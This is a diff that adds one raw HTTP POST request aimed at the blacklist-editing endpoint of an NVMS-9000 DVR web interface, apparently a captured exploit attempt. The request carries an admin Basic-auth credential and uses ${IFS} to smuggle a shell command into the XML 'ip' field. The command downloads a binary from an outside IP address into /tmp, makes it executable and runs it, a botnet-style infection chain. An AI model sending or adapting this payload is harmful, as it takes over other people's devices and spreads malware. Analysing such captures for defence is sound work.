@@ -1,0 +1,13 @@
+POST /editBlackAndWhiteList HTTP/1.1
+Accept-Encoding: identity
+Content-Length: 644
+Accept-Language: en-us
+Host: 35.188.24.85:8000
+Accept: */*
+User-Agent: Mozila/5.0
+Connection: close
+Cache-Control: max-age=0
+Content-Type: text/xml
+Authorization: Basic YWRtaW46ezEyMjEzQkQxLTY5QzctNDg2Mi04NDNELTI2MDUwMEQxREE0MH0=
+
+<?xml version="1.0" encoding="utf-8"?><request version="1.0" systemType="NVMS-9000" clientType="WEB"><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode><addressType><enum>ip</enum><enum>iprange</enum><enum>mac</enum></addressType></types><content><switch>true</switch><filterType type="filterTypeMode">refuse</filterType><filterList type="list"><itemType><addressType type="addressType"/></itemType><item><switch>true</switch><addressType>ip</addressType><ip>$(cd${IFS}/tmp;wget${IFS}http://92.118.230.134/garm7${IFS}-O-${IFS}>GSec;chmod${IFS}777${IFS}GSec;./GSec${IFS}tvt)</ip></item></filterList></content></request>
